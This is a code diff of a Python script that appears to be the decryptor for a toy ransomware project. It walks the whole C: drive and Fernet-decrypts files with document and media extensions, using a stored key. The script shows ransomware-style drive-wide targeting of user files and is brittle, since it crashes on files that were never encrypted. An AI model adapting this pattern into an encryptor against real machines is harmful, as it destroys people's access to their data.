@@ -1,18 +1,21 @@
 import os
 from cryptography.fernet import Fernet
 
-for file in os.listdir():
-    if file == "crypto.py" or file == ".git" or file == "key.key" or file == "decrypt.py":
-        continue
-    else:
-        with open("key.key",'rb') as theKey:
-            key = theKey.read()
+ext = ['.pdf','.doc','.xlsx','.mp4','.docx','.mp3','.sql','.csv','.mkv','.pptx']
 
-        with open(file,"rb") as fl:
-            data = fl.read()
+with open("key.key",'rb') as theKey:
+    key = theKey.read()
 
-        with open(file,"wb") as fl:
-            data = Fernet(key).decrypt(data)
-            fl.write(data)
+for i in ext:
+    for r, d, f in os.walk("C:\\"):
+        for file in f:
+            filepath = os.path.join(r, file)
+            if i in file:
+                with open(filepath,"rb") as fl:
+                    data = fl.read()
+                decryptData = Fernet(key).decrypt(data)
+                with open(filepath,"wb") as fl:
+                    
+                    fl.write(decryptData)
 
-print("Done")
+print("Be Happy")
